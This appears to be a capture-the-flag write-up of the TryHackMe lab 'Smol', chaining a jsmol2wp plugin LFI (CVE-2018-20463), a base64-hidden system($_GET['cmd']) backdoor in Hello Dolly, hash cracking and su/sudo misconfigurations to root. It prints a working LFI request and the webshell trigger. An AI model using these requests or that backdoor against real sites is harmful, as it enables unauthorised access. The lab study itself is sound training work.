---
title: "Smol: WordPress jsmol2wp LFI to a 5-User Chain to Root"
room: "Smol"
platform: TryHackMe
url: https://tryhackme.com/room/smol
difficulty: Medium
date_solved: 2026-07-11
time_to_solve: "≈35m"
tags: [wordpress, lfi, ssrf, rce, phpass, pam-su, sudo, password-reuse]
cves: [CVE-2018-20463]
flags: { user: true, root: true }
flagship: true
order: 10
---

Unauthenticated **LFI in the `jsmol2wp` plugin** leaks `wp-config.php` → WordPress admin → a private post points at a **backdoored Hello Dolly plugin** (`cmd` param) → RCE as `www-data`. Then a five-hop user chain: **diego → think → gege → xavi**: via a cracked WordPress hash, a readable SSH key, a passwordless `su`, and a password-protected backup, ends at **`xavi` with full `sudo` → root**.

## Recon
`nmap` shows only **22 (OpenSSH 8.2p1)** and **80 (Apache 2.4.41)**. Port 80 is WordPress on vhost `smol.thm`. Plugin enumeration surfaces **`jsmol2wp`**, which carries **CVE-2018-20463**: an unauthenticated SSRF/LFI. *Read:* an unauth file-read on WordPress means one thing: go straight for `wp-config.php`.

## Foothold
**1: LFI → DB creds.** The plugin proxies a `php://filter` path to disk:
```
GET /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
→ `DB_USER=wpuser`, `DB_PASSWORD=<redacted>`. Those creds are **reused** as the WordPress login (password reuse is the whole box's spine).

**2: Find the backdoor.** In `/wp-admin`, a private post: *"Webmaster Tasks"*: points at the **Hello Dolly** plugin. Read its source via the same LFI (`resource=../../../../wp-content/plugins/hello.php`); it hides a base64 `eval` decoding to `if (isset($_GET["cmd"])) { system($_GET["cmd"]); }`.

**3: RCE.** *Detail most writeups miss:* the backdoor only fires when WordPress **includes** Hello Dolly: i.e. on an **authenticated** admin page, not a direct call to `hello.php`. Trigger it with your session cookie: `GET /wp-admin/index.php?cmd=id` → `uid=33(www-data)`. A stateless GET webshell; no reverse shell needed.

## Privilege Escalation
Users `diego, gege, think, xavi` sit in the `internal` group with `750` homes. Dump the WordPress `wp_users` phpass hashes from MySQL and crack.

- **www-data → diego.** diego's phpass hash cracks (`hashcat -m 400`). *Gotcha:* diego's SSH is **publickey-only**, so the password can't `ssh` in, and `echo pw | su` fails (su reads `/dev/tty`). Drive `su diego` through a **`pty.fork()`** helper over the webshell → **user.txt** + read of `/home/think/.ssh/id_rsa` (diego ∈ `internal`).
- **diego → think.** `ssh -i id_rsa think@$IP`.
- **think → gege.** `wordpress.old.zip` is `root:gege 750`, unreadable to think, but **`su gege` needs no password** (a PAM misconfig). *Alpha:* you never crack gege's hash; many writeups do, wastefully.
- **gege → xavi.** As gege, open the ZipCrypto `wordpress.old.zip` → an old `wp-config.php` exposes **xavi's** password, reused for the account.
- **xavi → root.** `sudo -l` → **`(ALL : ALL) ALL`** → `sudo cat /root/root.txt`.

## Flags
User (`/home/diego/user.txt`) and root (`/root/root.txt`): both captured live; values masked per THM convention.

## The Lesson
Three things a live run proves that generic writeups get wrong: (1) the Hello Dolly backdoor is **auth-gated**, not a direct call; (2) diego is **key-only over SSH**: the cracked password only works through a PTY `su`; (3) **`su gege` is passwordless**: an entire crack step everyone else performs is unnecessary. That's the gap between echoing a walkthrough and owning the box.

